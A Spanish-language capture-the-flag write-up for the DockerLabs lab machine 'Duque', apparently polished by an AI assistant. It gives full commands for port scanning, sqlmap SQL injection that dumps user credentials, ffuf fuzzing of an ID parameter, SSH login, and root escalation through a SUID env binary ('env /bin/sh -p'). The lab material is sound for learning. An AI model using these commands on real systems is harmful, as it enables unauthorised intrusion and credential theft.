Tienes razón — aquí va tu informe **completo, mejor redactado**, pero **respetando totalmente tus imágenes y su posición**. Solo mejoré la explicación y claridad técnica sin mover nada.

---

# 🧠 **Informe de Pentesting – Máquina: Duque**

### 💡 **Dificultad:** Fácil

📦 **Plataforma:** DockerLabs

🌐 **Objetivo:** Comprometer la máquina obteniendo acceso inicial, credenciales válidas y escalando privilegios a root

![Despliegue](/Duque/Imagenes/Duque.png)

---

## 🚀 **Despliegue de la Máquina**

Se inicia la máquina vulnerable descomprimiendo el archivo proporcionado y ejecutando el script de despliegue:

```bash
unzip bicho.zip
sudo bash auto_deploy.sh duque.tar
```

---

## 📶 **Comprobación de Conectividad**

Se valida que la máquina objetivo se encuentra activa y responde a solicitudes ICMP:

```bash
ping -c1 172.17.0.2
```

---

## 🔍 **Escaneo de Puertos**

### 🔎 Escaneo Total

Se realiza un escaneo completo de todos los puertos TCP con el objetivo de identificar servicios expuestos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 
```

**Puertos abiertos identificados:**

* `22/tcp`: SSH
* `80/tcp`: HTTP

---

### 🧩 Detección de Servicios

Se procede a enumerar versiones y servicios activos:

```bash
nmap -sCV -p22,80 172.17.0.2 
```

![Puertos](/Duque/Imagenes/conectividad.png)

---

## 🧭 **Reconocimiento Web**

### 🖥️ Acceso inicial

Al acceder a:

```
http://172.17.0.2
```

Se observa una aplicación web funcional.

---

### 🗂️ Fuzzing de Directorios

```bash
gobuster dir -u http://172.17.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
-t 20 -add-slash -b 403,404 -x .php,.html,.txt
```

Se identifican múltiples rutas dentro de la aplicación.

![logs](/Duque/Imagenes/gobusteruno.png)

Durante este proceso se detecta el directorio:

```
/bills/
```

Este contiene un sistema de autenticación. Al analizar las peticiones con herramientas como Burp Suite, se observan indicios de una posible vulnerabilidad de **inyección SQL**.

---

## 🧪 **Explotación de Inyección SQL**

### 1. Comando Ejecutado

```bash
sqlmap -u "http://172.17.0.2/bills/" --data="username=admin&password=admin" --cookie="PHPSESSID=kb6o4ar4t76gcg2dnl2br89b8o" --level=5 --risk=3 --batch --dbs
```

![sqlverificar](/Duque/Imagenes/coamndoverifisqluno.png)

---

### 2. Resultados

Se confirma vulnerabilidad de tipo **SQL Injection**.

* DBMS: MySQL/MariaDB
* Bases de datos detectadas:

  * information_schema
  * mysql
  * performance_schema
  * **register**
  * sys

![sqlverificar](/Duque/Imagenes/confirsql.png)

---

## 🔎 **Enumeración de Tablas**

```bash
sqlmap -u "http://172.17.0.2/bills/" --data="username=admin&password=admin" --cookie="PHPSESSID=kb6o4ar4t76gcg2dnl2br89b8o" -D register --tables --batch
```

![sqlverificar](/Duque/Imagenes/coamndosegundosql.png)

---

### Resultados

* Base de datos: `register`
* Tabla encontrada: `users`

![sqlverificar](/Duque/Imagenes/userresuldossql.png)

---

## 📤 **Exfiltración de Datos**

```bash
sqlmap -u "http://172.17.0.2/bills/" --data="username=admin&password=admin" --cookie="PHPSESSID=kb6o4ar4t76gcg2dnl2br89b8o" -D register -T users --dump --batch
```

![sqlverificar](/Duque/Imagenes/comandotressql.png)

---

### Credenciales obtenidas

* mario : mario123
* jesus : jesus2026
* admin : admin123

![sqlverificar](/Duque/Imagenes/usuariosresultre.png)

---

### 🔍 Análisis

Aunque se obtuvieron credenciales válidas, no fue posible acceder por SSH. Esto sugiere que:

* Las credenciales son válidas solo a nivel de aplicación
* Existe separación entre autenticación web y sistema

---

## 🔎 **Análisis del parámetro `id`**

Se identifica el endpoint:

```
/bills/panel.php?id=
```

Durante pruebas manuales se observa que:

* Todas las peticiones devuelven **HTTP 302**
* Redirigen a `/bills/index.php`
* No hay diferencia visible entre respuestas

Esto indica que el sistema oculta los resultados inválidos mediante redirecciones, dificultando la enumeración directa.

---

## 🚀 **Fuzzing del parámetro `id`**

Dado que el comportamiento era uniforme, se decide aplicar fuzzing para detectar diferencias sutiles.

### 📌 Generación de Wordlist (Bash)

```bash
for c in {a..z} {0..7}; do
  for i in $(seq -w 0 999); do
    echo "xy${c}${i}"
  done
done > wordlist.txt
```

![wordlist](/Duque/Imagenes/wordlist.png)

---

## ⚠️ Problema encontrado

Al ejecutar fuzzing, todas las respuestas devolvían código `302`, lo que impedía diferenciar resultados válidos.

---

## 🧪 **Análisis de tamaño de respuesta**

Para identificar diferencias, se mide el tamaño de las respuestas con `curl`:

```bash
curl -s -o /dev/null -w "%{size_download}\n" "http://172.17.0.2/bills/panel.php?id=xyu597" -H "Cookie: PHPSESSID=j5e6711di3qkh1baclik2v6ebb"
```

![wordlist](/Duque/Imagenes/curltamaño.png)

Resultados:

* Respuesta inválida: **5906 bytes**
* Respuesta válida/diferente: **6163 bytes**

---

## 🎯 **Fuzzing con filtrado**

```bash
ffuf -u "http://172.17.0.2/bills/panel.php?id=FUZZ" -w wordlist.txt -H "Cookie: PHPSESSID=j5e6711di3qkh1baclik2v6ebb" -r -fs 5906 -c
```

---

## 🔑 **Hallazgo**

Se identifican múltiples respuestas con tamaño distinto, destacando:

![wordlist](/Duque/Imagenes/datos.png)

Uno de los valores válidos es:

```
xyu597
```

---

## 🔐 **Obtención de credenciales**

Al acceder con el ID válido, la aplicación muestra información sensible, incluyendo credenciales reutilizables en el sistema.

![wordlist](/Duque/Imagenes/contraseñassh.png)

---

## 🔓 **Acceso SSH**

Se prueban las credenciales obtenidas:

```bash
ssh usuario@172.17.0.2
```

Acceso exitoso al sistema.

---

## ⚡ **Escalada de privilegios**

Se enumeran binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

---

### 🔍 Análisis

Se identifica el binario:

```
/usr/bin/env
```

Este binario permite ejecutar comandos heredando privilegios si está mal configurado.

---

## 🚨 **Explotación**

```bash
env /bin/sh -p
```

### Explicación técnica:

* `env` ejecuta comandos en un entorno controlado
* `/bin/sh -p` preserva privilegios efectivos
* Permite obtener una shell con privilegios elevados

---

## 🏁 **Verificación**

```bash
whoami
```

Resultado:

```
root
```
![wordlist](/Duque/Imagenes/root.png)

---

**Nota**

Para obtener el parametro: -H "Cookie: PHPSESSID=j5e6711di3qkh1baclik2v6ebb" \
Use burtsuite para conseguir el dato interceptando la peticiòn cuando se manda un id=

![wordlist](/Duque/Imagenes/burtsuit.png)

---


